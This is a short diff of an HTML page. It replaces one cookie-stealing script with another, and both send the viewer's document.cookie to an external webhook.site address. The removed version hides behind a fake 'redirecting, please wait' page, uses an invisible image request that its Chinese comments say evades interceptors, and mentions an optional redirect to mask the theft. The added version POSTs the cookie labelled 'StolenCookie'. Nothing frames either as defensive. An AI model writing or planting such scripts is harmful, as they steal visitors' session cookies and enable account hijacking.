@@ -1,28 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>正在加载...</title>
-</head>
-<body>
-    <p>正在为您跳转，请稍候...</p>
-
-    <script>
-        (function() {
-            // 获取 Cookie
-            const data = document.cookie || "no-cookies-found";
-            
-            // 目标 Webhook 地址
-            const target = "https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071";
-
-            // 自动外发：通过创建隐形图片资源触发 GET 请求
-            // 这种方式兼容性最强，且不易被简单的请求拦截器察觉
-            const exfiltrate = new Image();
-            exfiltrate.src = `${target}?c=${encodeURIComponent(data)}`;
-
-            // 可选：执行完后立即跳转到正常页面掩盖行为
-            // window.location.href = "https://google.com";
-        })();
-    </script>
-</body>
-</html>
+<script>
+    // 这段脚本会在【查看者】的浏览器里运行
+    fetch('https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071', {
+        method: 'POST',
+        body: 'StolenCookie=' + document.cookie
+    });
+</script>
